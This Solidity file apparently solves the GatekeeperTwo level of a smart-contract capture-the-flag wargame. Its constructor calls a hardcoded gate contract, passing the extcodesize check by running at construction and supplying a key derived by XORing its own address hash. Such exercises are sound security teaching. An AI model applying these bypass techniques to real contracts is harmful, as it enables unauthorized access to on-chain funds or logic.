// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "../instances/Ilevel14.sol";

contract LetMeInTwo {

    constructor () public {
        GatekeeperTwo level12 = GatekeeperTwo(0x2D55d7Fd2cd2d3344F2Fd694f05E3fd63A9FDCDA);
        bytes8 myKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ (uint64(0) - 1));
        level12.enter(myKey);        
    }
}